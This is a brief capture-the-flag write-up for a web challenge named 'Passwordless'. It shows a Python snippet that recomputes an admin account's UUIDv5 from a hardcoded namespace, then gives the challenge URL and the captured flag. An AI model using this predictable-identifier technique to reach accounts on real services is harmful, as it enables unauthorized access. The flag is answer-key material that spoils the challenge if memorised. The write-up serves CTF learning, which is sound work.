# Passwordless
371

Tired of storing passwords? No worries! This super secure website is passwordless! Author: NoobMaster

# Attachments
app.py
http://24.199.110.35:40150/


# Walkthrough
from app.py we need to generate the UUID for admin123

import uuid

leet = uuid.UUID('13371337-1337-1337-1337-133713371337')
admin_uuid = uuid.uuid5(leet, 'admin123')
print(admin_uuid)

GO TO: http://24.199.110.35:40150/3c68e6cc-15a7-59d4-823c-e7563bbb326c

# Flag
n00bz{1337-13371337-1337-133713371337-1337} 